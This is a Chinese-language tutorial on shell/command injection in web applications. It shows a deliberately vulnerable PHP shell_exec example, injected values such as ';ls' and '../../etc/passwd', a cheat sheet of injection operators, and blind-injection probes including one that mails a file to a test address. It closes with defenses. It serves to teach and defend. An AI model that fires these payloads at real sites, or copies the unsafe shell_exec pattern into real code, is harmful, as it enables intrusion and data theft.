# Shell Injection & Command Injection

0x00 前言
-------

* * *

Shell注入(Shell Injection)，也被称为命令注入(Command Injection)，虽然不是最经常提及或发现的漏洞，但是危害巨大。

下面展开讨论一下shell注入。

0x01 简单介绍
---------

* * *

通常情况下，Web应用程序会有需要执行shell命令的时候，有可能只是使用Unix sendmail程序发送电子邮件，或运行指定的Perl和C + +程序。从开发的角度来看，这样做可以减少程序的开发时间。然而，如果数据是通过一个用户界面传递到这些程序中，则攻击者可能能够注入shell命令到这些后台程序。

举一个简单的例子：

```
<?php
echo shell_exec('cat '.$_GET['filename']);
?>

```

看起来很好用，我们需要输出文件内容，直接用cat输出，比如同目录下有一个my_great_content.txt文件，那么请求的url就为：

```
www.mysite.com/viewcontent.php?filename=my_great_content.txt

```

开发只需要一行代码，就可以达到期望的功能。

但是不幸的是，这段代码是不安全的，攻击者只需要使用一个分号（;）就可以继续执行其他的命令。

```
www.mysite.com/viewcontent.php?filename=my_great_content.txt;ls

```

该页面除了返回文件内容之外呢，还返回了当前目录下的文件

实际上这个文件除了shell注入之外，还有目录遍历的问题，使用`../../etc/passwd`等获取其他文件内容。

0x02 如何利用
---------

* * *

在前面的内容中，我们看到了如何进行命令注入的简单案例。下面看下shell注入的几种情况，以及如何进行shell注入。假设一些我们经过分析，已经发现了一个网站有shell注入，那么你将有很多种注入的方式。

前面的例子中，获取文件名并使用cat命令获取文本内容输出，我们可以使用分号（;）分隔进行注入，然而肯定有开发人员意识到此问题了，可能会过滤分号，但是仍有绕过的方式，下面是在shell注入中可能会用的字符，介绍一下：

### 重定向操作符

例如：`<，>>，>`

这些运算符是把结果输出到服务器的其他地方，< 是从文件中而不是从键盘中读入命令输入，可能被用来绕过过滤。>是把结果重定向到文件中，而不是写在命令提示符窗口中。>>把结果追加到别的文本当中，而不改变原来的内容。

### 管道符

例如：`|`

管道符可以把一个命令的输出重定向到下一个命令的输入，例如

```
cat file1 | grep "string"

```

### inline命令

例如：`;，,，$`

用来结束之前的命令，直接执行新的命令。

### 逻辑运算符

例如：`$，&&，||`

这些运算符用来对数据进行逻辑上的运算

### 常见的注入语句与结果

```
`shell_command`  执行shell_command命令
$(shell_command) 执行shell_command命令
| shell_command 执行shell_command命令并返回结果
|| shell_command 执行shell_command命令并返回结果
; shell_command 执行shell_command命令并返回结果
&& shell_command 执行shell_command命令并返回结果
> target_file 返回结果覆盖到target_file里
>> target_file 返回结果追加到target_file里
< target_file 把target_file的内容输入到之前的命令当中
- operator 给目标指令添加额外的参数

```

0x03 如何寻找shell注入
----------------

* * *

主要是寻找你怀疑的某个功能可以是后端用命令来执行的，可以进行简单的测试，由于操作系统系统可能不同，那么你测试的语句也应该是不一样的：

```
(Windows) <normal_input>; dir c:
(Unix)    <normal_input>; ls

```

同时还要注意执行命令可能存在的引号，例如：

```
<?php
//sending the input directly. Attack with a string like file.txt;ls
echo shell_exec('cat '.$_GET['command']);
?>

<?php
//input is placed in quotes.  You must end the quotes to execute an injection.
//Craft an attack with a string like file.txt";ls
echo shell_exec('cat "'.$_GET['command']).'"';
?>

```

### 盲注

如果有时候并没有命令回显，那么可以用以下方式检测是否存在盲注：

```
file.txt;mail tester@test.com < file.txt    //send an email to yourself
file.txt;ping www.test.com      //ping a webserver you have control of
file.txt;echo "test" > test.txt     //write the word "test" to test.txt. try opening this file with the browser. 

```

0x04 如何防御
---------

* * *

尽管上面说有很多方式进行shell注入，但是可以用几个简单的方式进行防御，最主要的是过滤所有用户输入的数据，最好是能避免用户的数据直接进入命令执行当中，如果不可避免，尽量避免（; | &）等符号，最好是用白名单。

如果不能是白名单，PHP当中提供了escapeshellarg和escapeshellcmd两个函数进行过滤，但这并不能完全保障代码的安全性。需要具体情况再做相应的滤。

from:[https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection](https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection)